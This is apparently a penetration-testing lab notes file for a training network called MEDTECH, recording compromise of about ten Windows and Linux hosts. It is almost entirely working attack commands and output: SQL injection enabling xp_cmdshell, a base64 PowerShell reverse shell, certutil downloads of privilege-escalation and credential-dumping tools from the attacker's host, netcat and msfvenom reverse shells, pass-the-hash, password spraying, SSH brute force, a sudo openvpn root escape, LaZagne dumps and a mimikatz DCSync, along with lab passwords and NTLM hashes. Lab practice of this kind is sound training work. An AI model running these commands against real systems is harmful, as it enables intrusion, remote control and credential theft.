@@ -1,0 +1,601 @@
+				MEDTECH 
+We have been tasked to conduct a penetration test for MEDTECH a recently formed IoT healthcare startup. Our objective is to find as many vulnerabilities and misconfigurations as possible in order to increase their Active Directory security posture and reduce the attack surface.
+The organization topology diagram is shown below and the public subnet network resides in the 192.168.xx.0/24 range, where the xx of the third octet can be found under the IP ADDRESS field in the control panel.
+---------------------------------------------------------------------------------------------
+192.168.207.120 - WEB01.DMZ.MEDTECH.COM - Root:proof.txt 		(Pwn3d!)✅
+192.168.207.121 - WEB02.DMZ.MEDTECH.COM - Administrator:proof.txt	(Pwn3d!)✅
+192.168.207.122 - VPN.DMZ.MEDTECH.COM - offsec:local.txt, proof.txt	(Pwn3d!)✅
+172.16.207.10 - DC01: leon: , Administrator:proof.txt			(Pwn3d!)✅
+172.16.207.11 - FILES02: joe:local.txt, Administrator:proof.txt		(Pwn3d!)✅
+172.16.207.12 - DEV04: yoshi:local.txt, 				(Pwn3d!)✅
+172.16.207.13 - PROD01: Administrator:proof.txt				(Pwn3d!)✅
+172.16.207.14 - NTP: mario:local.txt 					(Pwn3d!)✅
+172.16.207.82 - CLIENT01: Administrator:proof.txt			(Pwn3d!)✅
+172.16.207.83 - CLIENT02: wario:local.txt, Administrator:proof.txt	(Pwn3d!)✅
+
+PROOF.txt
+192.168.182.120: WEB01	(Pwn3d!)
+192.168.182.121: WEB02	(Pwn3d!)
+192.168.182.122: VPN	(Pwn3d!)
+172.16.182.10: DC01	(Pwn3d!)
+172.16.182.11: FILES02	(Pwn3d!)
+172.16.182.12: DEV04	(Pwn3d!)
+172.16.182.13: PROD01	(Pwn3d!)
+172.16.182.14: NTP	(Pwn3d!)
+172.16.182.82: CLIENT01	(Pwn3d!)
+172.16.182.83: CLIENT02	(Pwn3d!)
+
+LOCAL.txt
+Administrator: - 192.168.182.121
+offsec:local.txt - 192.168.182.122
+joe:local.txt - 172.16.182.11
+wario:local.txt - 172.16.182.83
+yoshi:local.txt - 172.16.182.12
+mario:local.txt - 172.16.207.14
+leon: 
+peach: 
+
+CREDS:
+Administrator:point145dream
+offsec:century62hisan51
+offsec:lab
+offsec:password
+joe:Flowers1
+wario:Mushroom!
+leon:rabbit:)
+yoshi:Mushroom!
+mario:luigi12 
+peach:princess0011
+!!sexyangel!!
+WhileChirpTuesday218
+
+---------------------------------------------------------------------------------------------
+					PROGRESS: 
+nmap -sCV -A -T4 -O 172.16.182.12
+nmap -p 135,139,445,3389,47001,49665,49667,49668,49669,49670 -sCV -A -T4 -O -oN 172.16.216.12
+
+
+INITAL FOOTHOLD: SQLI SYNTAX
+You’re gonna want to turn on the xp_cmdshell using a one liner and then sending a base64encoded reverse powershell.
+
+# SQLi MSSQL query to the server to enable, inject in tht vulnerable parameter
+1';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE-- 
+
+# to verify by send myself a request
+1';DECLARE @cmd VARCHAR(8000);SET @cmd = 'curl http://192.168.45.243:80';EXEC xp_cmdshell @cmd-- 
+
+# powershell request
+1';DECLARE @cmd VARCHAR(8000);SET @cmd = 'powershell "Invoke-WebRequest -Uri http://192.168.45.243:4444"';EXEC xp_cmdshell @cmd-- 
+
+# use when there is a limit to the # of columns in the database. Enter a random password and click the login button.
+' or 1=1 LIMIT 1,1 #
+
+# I bypassed powershell restrictions just in case
+1';DECLARE @cmd VARCHAR(8000);SET @cmd = 'powershell "-ep bypass"';EXEC xp_cmdshell @cmd;-- 
+
+# I then send a reverse powershell one-liner encoded in base64: https://www.revshells.com/
+1';DECLARE @cmd VARCHAR(8000);SET @cmd = 'powershell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="';EXEC xp_cmdshell @cmd;--
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ python3 -m http.server 80
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 4444
+Directory: 
+PS C:\Windows\system32
+PS C:\Windows> cd c:\inetpub\wwwroot\
+
+DCOM PRIV ESQ
+PS C:\Users\Public\Downloads> certutil.exe -urlcache -split -f "http://192.168.45.243/GodPotato-NET4.exe" GodPotato2.exe
+.\GodPotato2.exe -cmd "cmd /c whoami"
+certutil.exe -urlcache -split -f "http://192.168.45.243/nc64.exe" nc64.exe
+.\GodPotato2.exe -cmd "C:\Users\Public\Downloads\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.243 2560"
+
+DUMP PASSWORDS
+PS C:\Users\Public\Downloads> certutil.exe -urlcache -split -f "http://192.168.45.243/LaZagne.exe" lazagne.exe
+C:\Users\Public\Downloads>.\laZagne.exe all
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:b2c03054c306ac8fc5f9d188710b0168 Administrator@192.168.207.121
+
+
+1. 192.168.207.121 - WEB02.DMZ.MEDTECH.COM: SQLI - LaZagne - WINRM: ADMIN PROOF
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:b2c03054c306ac8fc5f9d188710b0168 Administrator@192.168.185.121
+evil-winrm -i 192.168.182.121 -u Administrator -H b2c03054c306ac8fc5f9d188710b0168 
+LIGOLO - FOR JOE
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+python3 -m http.server 8000
+iwr -uri http://192.168.45.170:8000/agent.exe -Outfile agent.exe
+./agent -connect 192.168.45.170:11601 -ignore-cert
+sudo ip route add 172.16.182.0/24 dev ligolo
+ip route
+start
+
+2. 172.16.207.11 - FILES02: joe:local.txt, Administrator:proof.txt - LIGOLO - LaZagne - ADMIN PROOF
+crackmapexec winrm ip.txt -u "joe" -p "Flowers1" 
+evil-winrm -u joe -p Flowers1 -i 172.16.185.11
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:f1014ac49bae005ee3ece5f47547d185 Administrator@172.16.185.11
+
+3. 172.16.207.83 - CLIENT02: JoeIP- wario: local.txt, Administrator: NOT YET
+crackmapexec winrm ip.txt -d medtech.com -u wario -p 'Mushroom!' --continue-on-success
+evil-winrm -u wario -p Mushroom! -i 172.16.185.83
+
+4. 172.16.207.10 - DC01: leon: , Administrator:proof.txt
+impacket-wmiexec medtech/leon:'rabbit:)'@172.16.185.10
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.170 LPORT=1234 -f exe > rev.exe
+certutil.exe -urlcache -split -f "http://192.168.45.170:8000/rev.exe" rev.exe
+PS C:\Users\leon\Downloads> .\laz.exe all
+evil-winrm -u Administrator -H c33b5cf9fa1b1bb4894d4a6cd7c54034 -i 172.16.182.10
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat credentials.txt
+web01: offsec/century62hisan51
+
+5. 192.168.207.120 - WEB01.DMZ.MEDTECH.COM - SSH
+ssh offsec@192.168.185.120
+century62hisan51
+history
+offsec@WEB01:~/offsec$ sudo su
+root@WEB01:~# cat proof.txt
+b002748732472f426b5bba7784d9bda5
+
+6. 172.16.207.82 - CLIENT01: yoshi: , Administrator:proof.txt  - RDP
+xfreerdp /u:yoshi /p:Mushroom! /v:172.16.185.82
+Get-ChildItem -Path C:\ -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue
+
+7. 172.16.207.12 - DEV04: yoshi:local.txt, - RDP
+xfreerdp /u:yoshi /p:Mushroom! /v:172.16.182.12
+
+8. 192.168.207.122 - VPN.DMZ.MEDTECH.COM - offsec:local.txt, 	
+hydra -l "offsec" -P "/usr/share/wordlists/rockyou.txt" -e nsr -s 22 ssh://192.168.182.122
+[22][ssh] host: 192.168.182.122   login: offsec   password: password
+ssh offsec@192.168.182.122
+password
+offsec:~$ ls
+local.txt
+offsec:~$ cat local.txt
+b33eac8e4a31e6c9cacf169b97621851
+offsec:~$ sudo -l
+Matching Defaults entries for offsec on vpn:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+User offsec may run the following commands on vpn:
+    (ALL : ALL) /usr/sbin/openvpn
+https://gtfobins.github.io/gtfobins/openvpn/
+offsec:~$ sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
+# whoami
+root
+# python3 -c 'import pty; pty.spawn("/bin/bash")'
+root@vpn:/root# ls
+proof.txt  scripts  snap
+root@vpn:/root# cat proof.txt
+ebe6aaba9da1f6a4677ec6fc51913c0a
+
+9. 172.16.207.14 - NTP: mario:local.txt
+ssh offsec@192.168.182.122
+password
+offsec:~$ history
+offsec:~$ sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
+# cd ~
+# python3 -c 'import pty; pty.spawn("/bin/bash")'
+root@vpn:/home/offsec# cd ..
+root@vpn:/home# ls
+mario  offsec
+root@vpn:/home# cd mario
+root@vpn:/home/mario# ls -la
+total 32
+drwxr-x--- 4 mario mario 4096 Oct  6  2022 .
+drwxr-xr-x 4 root  root  4096 Oct  3  2022 ..
+-rw------- 1 mario mario   58 Oct  3  2022 .bash_history
+-rw-r--r-- 1 mario mario  220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 mario mario 3771 Jan  6  2022 .bashrc
+drwx------ 2 mario mario 4096 Oct  6  2022 .cache
+-rw-r--r-- 1 mario mario  807 Jan  6  2022 .profile
+drwx------ 2 mario mario 4096 Oct  3  2022 .ssh
+root@vpn:/home/mario# cd .ssh
+root@vpn:/home/mario/.ssh# ls
+id_rsa  id_rsa.pub  known_hosts  known_hosts.old
+root@vpn:/home/mario/.ssh# sudo ssh -i id_rsa -p 22 mario@172.16.182.14
+$ ls
+local.txt
+$ cat local.txt
+082b7ae22195862f82bcc251ce0e55f9
+$ id
+uid=1001(mario) gid=1001(mario) groups=1001(mario)
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+10. 172.16.207.13 - PROD01: Administrator:proof.txt	(Pwn3d!)
+impacket-wmiexec medtech/leon:'rabbit:)'@172.16.182.13
+C:\Users\Administrator\Desktop>type proof.txt
+11cdf7b3624774db348135061252a132
+
+11. 172.16.207.12 - DEV04: yoshi:local.txt, Administrator:proof.txt	(Pwn3d!)
+xfreerdp /u:yoshi /p:Mushroom! /v:172.16.185.82
+* We abuse the file located in C:\ŦEMP\backup.exe using a reverse shell and we got nt authority\system
+impacket-wmiexec medtech/leon:'rabbit:)'@172.16.182.12
+C:\Users\Administrator\Desktop>type proof.txt
+ff235d7780b02b4d0cf3e8bb47e67f2a
+
+12. 
+impacket-wmiexec medtech/leon:'rabbit:)'@172.16.182.83
+C:\Users\Administrator\Desktop>type proof.txt
+02ef147dede7a8aa9866fb452a6d5f27
+
+
+---------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------
+Administrator - WEB02 - PWNDED
+Administrator   | b2c03054c306ac8fc5f9d188710b0168 | point145dream |
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:b2c03054c306ac8fc5f9d188710b0168:::
+
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:b2c03054c306ac8fc5f9d188710b0168 Administrator@192.168.185.121
+evil-winrm -i 192.168.185.121 -u Administrator -H b2c03054c306ac8fc5f9d188710b0168 
+
+LIGOLO - FOR JOE
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+python3 -m http.server 8000
+iwr -uri http://192.168.45.170:8000/agent.exe -Outfile agent.exe
+./agent -connect 192.168.45.170:11601 -ignore-cert
+sudo ip route add 172.16.185.0/24 dev ligolo
+ip route
+
+---------------------------------------------------------------------------------------------
+JOE - (Pwn3d!)
+joe             | 08d7a47a6f9f66b97b1bae4178747494 | Flowers1 
+
+crackmapexec winrm ip.txt -u "joe" -p "Flowers1" 
+WINRM       172.16.185.11   5985   FILES02          [+] medtech.com\joe:Flowers1 (Pwn3d!)
+
+WINRM: YES
+evil-winrm -u joe -p Flowers1 -i 172.16.185.11
+*Evil-WinRM* PS C:\Users\joe\Desktop> cat local.txt
+8715b89c7285a4fdb1332ecb0e2f2707
+*Evil-WinRM* PS C:\Users\joe\Desktop> whoami
+medtech\joe
+*Evil-WinRM* PS C:\Users\joe\Desktop> hostname
+FILES02
+*Evil-WinRM* PS C:\Users\joe\Documents> ipconfig
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::e57b:9d76:3b1c:1d3a%6
+   IPv4 Address. . . . . . . . . . . : 172.16.185.11
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.185.254
+
+SMB: YES
+impacket-psexec joe:Flowers1@172.16.185.11 cmd.exe
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:f1014ac49bae005ee3ece5f47547d185 Administrator@172.16.185.11
+C:\Users\Administrator\Desktop> type proof.txt
+b544010a9c950d18376602774e49703e
+
+*Evil-WinRM* PS C:\Users\joe\Downloads> .\laz.exe all
+[+] System masterkey decrypted for 28ae257f-3818-40f4-8cea-9a07eac10f59
+[+] System masterkey decrypted for 4d9f4654-a00b-4631-b36d-70dc450e9419
+[+] System masterkey decrypted for f5f0c322-b3da-430a-85f7-4e7d41e19924
+########## User: SYSTEM ##########
+------------------- Hashdump passwords -----------------
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f1014ac49bae005ee3ece5f47547d185:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:0c6ce171c9cc3afb29ca0ccc335e49bb:::
+------------------- Pypykatz passwords -----------------
+[+] Shahash found !!!
+Shahash: f56240be973998a518e1ceda47a8144bc426496b
+Nthash: 93123565ebfe3cdc6d7bb4ae80e16c60
+Login: FILES02$
+
+[+] Shahash found !!!
+Shahash: 5e95d6c43e70e142df33af3b50ab0baa6ca02bad
+Nthash: f1014ac49bae005ee3ece5f47547d185
+Login: Administrator
+------------------- Lsa_secrets passwords -----------------
+
+$MACHINE.ACC
+0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   16 B7 3C 74 34 E1 1C 13 C2 FC 22 10 60 8F 83 43    ..<t4.....".`..C
+0020   34 8D 56 B3 48 31 4E 03 DB 12 AF 3E 23 DC CA 18    4.V.H1N....>#...
+0030   93 C4 E3 AE 43 20 D8 1F 04 7C 6B C6 94 5A 74 FB    ....C ...|k..Zt.
+0040   F3 EB 17 D0 45 FF 2A 20 DC 66 44 BB 26 E9 59 C4    ....E.* .fD.&.Y.
+0050   9A B9 E4 D7 DE 0B 62 8B 47 0A DE 94 0F A9 AC D3    ......b.G.......
+0060   40 0A 90 D7 4E 0B 7C F1 85 7B F3 56 3D 0A 9E E0    @...N.|..{.V=...
+0070   5D AB 54 52 5F 4D F8 53 F1 CF D2 52 DA EE 8C 9F    ].TR_M.S...R....
+0080   B1 00 20 9C E3 CC AE D0 26 BC 75 C5 C2 02 92 68    .. .....&.u....h
+0090   3B 3A D0 0A 39 8C 30 D1 43 45 4B 7D 2C 2D E2 64    ;:..9.0.CEK},-.d
+00A0   07 2B 21 A0 91 3D 80 0D BC 50 65 51 AB AA E6 B8    .+!..=...PeQ....
+00B0   54 DB 2F 6A 4C 78 50 E5 39 7A 5C C8 6E F5 B4 34    T./jLxP.9z..n..4
+00C0   2B 74 84 35 77 D5 A0 3D B2 28 E0 30 FE 03 1B C0    +t.5w..=.(.0....
+00D0   E5 1D 0B 9D 6C A8 40 B6 F2 74 2B E2 CB 77 41 01    ....l.@..t+..wA.
+00E0   EC DD 79 D0 9D 40 1C C8 7C F3 E6 27 79 77 ED 63    ..y..@..|..'yw.c
+00F0   16 D0 9D B8 34 36 58 F2 47 33 88 E6 04 B9 04 1A    ....46X.G3......
+0100   B7 66 F8 72 D1 2C 25 5B 24 79 E9 23 12 FD FD 25    .f.r.,%[$y.#...%
+DefaultPassword
+0000   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   89 A9 BB 47 FC E5 BC 94 D5 4E 61 7E 17 C0 5A B2    ...G.....Na~..Z.
+DPAPI_SYSTEM
+0000   01 00 00 00 8B ED 59 6D 11 0C 49 AB 7A 63 06 03    ......Ym..I.zc..
+0010   5A 48 13 1D BE 10 4C CE 18 11 C0 1D 68 68 B0 24    ZH....L.....hh.$
+0020   10 B5 C1 78 8D 5A F1 AF E4 C8 3B 21                ...x.Z....;!
+NL$KM
+0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
+0010   C3 AB 94 BE FA CB 08 8C 46 FA 4E F3 28 95 F4 D7    ........F.N.(...
+0020   B7 9F 6B 0B CD 94 9E 8A 4F 44 ED 1B E2 7F 1C 05    ..k.....OD......
+0030   65 2D D1 64 7B 85 1F 78 D3 0F A3 4D 4B 21 4E DB    e-.d{..x...MK!N.
+0040   B8 96 7A 7C 3A AD 4B 7C FE 85 26 3A EE 7D 54 C3    ..z|:.K|..&:.}T.
+0050   78 A9 1F 33 56 32 86 71 84 2B 32 28 4B 0E 13 23    x..3V2.q.+2(K..#
+
+[+] 5e95d6c43e70e142df33af3b50ab0baa6ca02bad ok for masterkey 38457bfb-ee82-4936-88e0-8f50dff1193d
+[+] 5e95d6c43e70e142df33af3b50ab0baa6ca02bad ok for masterkey 9d9209e1-dee0-42fd-9e54-ffdb15f14bfd
+
+---------------------------------------------------------------------------------------------
+wario 
+
+$$$ Make a habit of spraying  whenever you find anything new credentials 
+crackmapexec winrm ip.txt -d medtech.com -u wario -p 'Mushroom!' --continue-on-success
+WINRM       172.16.185.83   5985   172.16.185.83    [+] medtech.com\wario:Mushroom! (Pwn3d!)
+
+crackmapexec smb 172.16.185.10 -u usernames.txt -p passwords.txt -d medtech.com --continue-on-success
+
+impacket-psexec wario:Mushroom!@172.16.185.83 cmd.exe
+
+
+┌──(kali㉿kali)-[~/Desktop/MEDTECH]
+└─$ crackmapexec winrm ip.txt -d medtech.com -u wario -p 'Mushroom!'
+HTTP        192.168.185.121 5985   192.168.185.121  [*] http://192.168.185.121:5985/wsman
+WINRM       192.168.185.121 5985   192.168.185.121  [-] medtech.com\wario:Mushroom!
+HTTP        172.16.185.13   5985   172.16.185.13    [*] http://172.16.185.13:5985/wsman
+HTTP        172.16.185.83   5985   172.16.185.83    [*] http://172.16.185.83:5985/wsman
+HTTP        172.16.185.12   5985   172.16.185.12    [*] http://172.16.185.12:5985/wsman
+HTTP        172.16.185.11   5985   172.16.185.11    [*] http://172.16.185.11:5985/wsman
+WINRM       172.16.185.13   5985   172.16.185.13    [-] medtech.com\wario:Mushroom!
+WINRM       172.16.185.83   5985   172.16.185.83    [+] medtech.com\wario:Mushroom! (Pwn3d!)
+WINRM       172.16.185.12   5985   172.16.185.12    [-] medtech.com\wario:Mushroom!
+HTTP        172.16.185.10   5985   172.16.185.10    [*] http://172.16.185.10:5985/wsman
+WINRM       172.16.185.11   5985   172.16.185.11    [-] medtech.com\wario:Mushroom!
+WINRM       172.16.185.10   5985   172.16.185.10    [-] medtech.com\wario:Mushroom!
+
+WINRM       172.16.185.83   5985   172.16.185.83    [+] medtech.com\wario:Mushroom! (Pwn3d!)
+
+┌──(kali㉿kali)-[~/Desktop/MEDTECH]
+└─$ evil-winrm -u wario -p Mushroom! -i 172.16.185.83
+
+*Evil-WinRM* PS C:\Users\wario\Desktop> hostname
+CLIENT02
+
+*Evil-WinRM* PS C:\Users\wario\Desktop> whoami
+medtech\wario
+
+*Evil-WinRM* PS C:\Users\wario\Desktop> cat local.txt
+02f09b870aed9198533a3541dd0588a7
+
+
+			WINPEAS: PRIV ESC
+
+Evil-WinRM* PS C:\Users\wario\Documents> (Get-PSReadlineOption).HistorySavePath
+C:\Users\wario\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt
+
+LDAP://DC=medtech,DC=com
+
+C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
+
+
+		Interesting Services -non Microsoft
+auditTracker(auditTracker)[C:\DevelopmentExecutables\auditTracker.exe] 
+Autoload - isDotNet
+File Permissions: Everyone [AllAccess], Authenticated Users [WriteData/CreateFiles]
+Possible DLL Hijacking in binary folder: C:\DevelopmentExecutables (Everyone [AllAccess], Authenticated Users [WriteData/CreateFiles])                                                        
+Tracks the security event log for audit events
+
+OpenSSH Authentication Agent(OpenSSH Authentication Agent)
+C:\Windows\System32\OpenSSH\ssh-agent.exe
+Manual                                                                                
+Agent to hold private keys used for public key authentication.
+
+          ͹ Checking write permissions in PATH folders (DLL Hijacking)
+  Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking                                                          
+    C:\Windows\system32
+    C:\Windows
+    C:\Windows\System32\Wbem
+    C:\Windows\System32\WindowsPowerShell\v1.0\
+    C:\Windows\System32\OpenSSH\
+
+          ͹ Autorun Applications
+    RegPath: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+    RegPerms: wario [FullControl]
+    Key: OneDriveSetup
+    Folder: C:\Windows\SysWOW64
+    File: C:\Windows\SysWOW64\OneDriveSetup.exe /thfirstsetup
+
+    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+    Key: SecurityHealth
+    Folder: C:\Windows\system32
+    File: C:\Windows\system32\SecurityHealthSystray.exe
+
+    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+    Key: VMware User Process
+    Folder: C:\Program Files\VMware\VMware Tools
+    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected)
+
+    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
+    Key: Common Startup
+    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)  
+
+    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
+    Key: Common Startup
+    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)    
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
+    Key: Shell
+    Folder: None (PATH Injection)
+    File: explorer.exe
+
+    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
+    Key: AlternateShell
+    Folder: None (PATH Injection)
+    File: cmd.exe
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
+    Key: Adobe Type Manager
+    Folder: None (PATH Injection)
+    File: atmfd.dll
+
+evil-winrm -u Administrator -H e8deb837a4d5457650813446f38c0e77 -i 172.16.185.83
+Administrator:e8deb837a4d5457650813446f38c0e77 
+
+---------------------------------------------------------------------------------------------
+yoshi
+
+$$$ Make a habit of spraying  whenever you find anything new credentials 
+
+xfreerdp /u:yoshi /p:Mushroom! /v:172.16.185.82
+
+PRIV ESC: 
+- Open PowerShell with admin priv - right click 
+Get-ChildItem -Path C:\ -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue
+PS C:\Users\Administrator\Desktop> type proof.txt
+96069f76ea7158c7306c350c4222aff7
+
+          ͹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)                                                                                   
+     File Permissions "C:\Users\yoshi\Downloads\winpea.exe": yoshi [AllAccess]
+     File Permissions "C:\Users\yoshi\Downloads\rev.exe": yoshi [AllAccess]
+     File Permissions "C:\Users\yoshi\Downloads\mimikatz2.exe": yoshi [AllAccess]
+     File Permissions "C:\Users\yoshi\Downloads\mimikatz.exe": yoshi [AllAccess]
+     File Permissions "C:\Users\yoshi\Downloads\laz.exe": yoshi [AllAccess]
+     File Permissions "C:\TEMP\backup.exe": yoshi [WriteData/CreateFiles]
+
+
+* We abuse the file located in C:\ŦEMP\backup.exe using a reverse shell and we got nt authority\system
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.170 LPORT=4444 -f exe > reverse.exe
+iwr -uri http://192.168.45.170:8000/rev2.exe -Outfile rev2.exe
+
+---------------------------------------------------------------------------------------------
+Leon
+┌──(kali㉿kali)-[~]
+└─$ impacket-wmiexec medtech/leon:'rabbit:)'@172.16.185.10
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.170 LPORT=1234 -f exe > rev.exe
+certutil.exe -urlcache -split -f "http://192.168.45.170:8000/rev.exe" rev.exe
+
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -u Administrator -H c33b5cf9fa1b1bb4894d4a6cd7c54034 -i 172.16.185.10
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> hostname
+DC01
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
+medtech\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat proof.txt
+e036e6a4902f38bcbffbbdadf7fa133e
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat credentials.txt
+web01: offsec/century62hisan51
+
+
+PS C:\Users\leon\Downloads> .\laz.exe all
+.\laz.exe all
+[+] System masterkey decrypted for 0901dfb2-6f40-45bf-a25a-22650939ab19
+[+] System masterkey decrypted for 60e7d0f9-c2a5-41aa-adef-01aaad32d528
+[+] System masterkey decrypted for 818e7b22-5102-47bc-954a-979e32b0bbe1
+[+] System masterkey decrypted for 90f7b471-c5be-46df-b106-2cd49e12dec2
+########## User: SYSTEM ##########
+------------------- Pypykatz passwords -----------------
+[+] Shahash found !!!
+Shahash: 7fb7231f8b2114b9833510db6374dff1ca3a8447
+Nthash: c33b5cf9fa1b1bb4894d4a6cd7c54034
+Login: Administrator
+
+[+] Shahash found !!!
+Shahash: ff27f637c679c8b8b958a630edf930dbd8a969d3
+Nthash: c95bb9678cbd2d810db302584305be39
+Login: DC01$
+------------------- Lsa_secrets passwords -----------------
+$MACHINE.ACC
+0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   82 48 9A 97 A1 75 15 46 CA 0D A8 EC 12 72 CE CC    .H...u.F.....r..
+0020   E4 68 2B 01 30 BB 1A 3B 1C 27 34 97 65 91 E0 B9    .h+.0..;.'4.e...
+0030   75 B6 47 52 A3 B1 EC B1 C1 F3 3D 2C C4 27 1C D7    u.GR......=,.'..
+0040   F7 11 17 EC 49 A2 A4 4B 39 2F 95 C1 60 BC C5 50    ....I..K9/..`..P
+0050   F4 65 32 52 66 14 21 AF 93 2D EB 09 AB 77 25 5F    .e2Rf.!..-...w%_
+0060   B7 81 26 31 41 5F 2A C4 3B 7A 7B 9E 01 13 49 D2    ..&1A_*.;z{...I.
+0070   41 A2 7D BF D5 7F A3 32 4D 71 88 AB 65 3C 0E 1F    A.}....2Mq..e<..
+0080   B9 2C FD C1 C2 19 B6 06 55 B3 83 9F BA 02 D6 F1    .,......U.......
+0090   24 06 55 26 49 1A 93 7E 85 63 8D 4B CD 08 21 13    $.U&I..~.c.K..!.
+00A0   00 A4 E2 7E 24 CB 83 60 BF 3A D3 DE 92 7F 9C 8F    ...~$..`.:......
+00B0   38 27 5E F9 8D 38 0A 29 A0 1C F9 7D 49 D0 39 4E    8'^..8.)...}I.9N
+00C0   82 8B F2 D4 DD 40 08 C4 8A E0 26 BC 15 2A 55 3E    .....@....&..*U>
+00D0   DC F4 13 90 07 3B 6E BB B1 6C D2 01 30 31 6A 91    .....;n..l..01j.
+00E0   90 EA 85 C2 8A E8 45 22 86 BA 9D 35 0C 00 81 C6    ......E"...5....
+00F0   31 97 A9 3D 15 AA 00 9F 77 76 E1 2F 77 0B 74 F9    1..=....wv./w.t.
+0100   13 F0 71 EE 65 AD 8E 1E 8C 60 B7 1A DB CE 04 AD    ..q.e....`......
+
+DPAPI_SYSTEM
+0000   01 00 00 00 5E AF 46 3E A1 39 63 2E 43 DD 73 0D    ....^.F>.9c.C.s.
+0010   20 36 E4 CF 2A 49 26 7D 5A 28 0C 92 0A 3D 58 37     6..*I&}Z(...=X7
+0020   5A 69 99 05 70 06 B4 D5 67 07 77 57                Zi..p...g.wW
+
+NL$KM
+0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
+0010   7D 16 EE 38 FE 13 F7 FC 7C F8 FE 03 73 B9 8F 55    }..8....|...s..U
+0020   A8 86 BB D3 EA 88 C8 FF 75 88 FD 48 AC 73 4C C6    ........u..H.sL.
+0030   17 DE FE 92 F1 49 AD EF 20 3A 85 EE F9 9D CD 53    .....I.. :.....S
+0040   22 06 93 D3 91 43 77 88 0F 6A 5E BD 43 9F 4D 61    "....Cw..j^.C.Ma
+0050   6B 36 E1 70 34 51 11 A7 24 3F 87 53 54 3B 47 D6    k6.p4Q..$?.ST;G.
+
+[+] 2 passwords have been found.
+For more information launch it again with the -v option
+
+elapsed time = 7.156246662139893
+
+mimikatz # lsadump::dcsync /all /csv
+[DC] 'medtech.com' will be the domain
+[DC] 'DC01.medtech.com' will be the DC server
+[DC] Exporting domain 'medtech.com'
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+1000    offsec  2892d26cdf84d7a70e2eb3b9f05c425e        66048
